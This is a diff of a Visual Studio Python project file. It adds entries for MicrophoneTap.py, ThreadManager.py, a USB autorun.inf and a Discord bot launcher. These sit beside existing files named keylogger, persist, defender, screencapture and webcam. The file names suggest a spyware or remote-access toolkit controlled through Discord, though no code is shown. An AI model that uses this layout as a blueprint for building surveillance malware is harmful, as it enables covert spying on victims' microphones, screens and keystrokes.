@@ -674,10 +674,12 @@
     <Compile Include="env\Lib\site-packages\yarl\__init__.py" />
     <Compile Include="Python\discordbot.py" />
     <Compile Include="Python\keylogger.py" />
+    <Compile Include="Python\MicrophoneTap.py" />
     <Compile Include="Python\persist.py" />
     <Compile Include="Python\ProgrammingOffensively.py" />
     <Compile Include="Python\defender.py" />
     <Compile Include="Python\screencapture.py" />
+    <Compile Include="Python\ThreadManager.py" />
     <Compile Include="Python\webcam.py" />
   </ItemGroup>
   <ItemGroup>
@@ -844,6 +846,7 @@
     <Folder Include="env\Python\" />
     <Folder Include="env\Scripts\" />
     <Folder Include="Python\" />
+    <Folder Include="Python\USBFolder\" />
   </ItemGroup>
   <ItemGroup>
     <Content Include="env\.gitignore" />
@@ -1700,6 +1703,8 @@
     <Content Include="env\Scripts\pythonw.exe" />
     <Content Include="MISSING.md" />
     <Content Include="Python\.env" />
+    <Content Include="Python\run_discordbot.bat" />
+    <Content Include="Python\USBFolder\autorun.inf" />
   </ItemGroup>
   <ItemGroup>
     <Interpreter Include="env\">
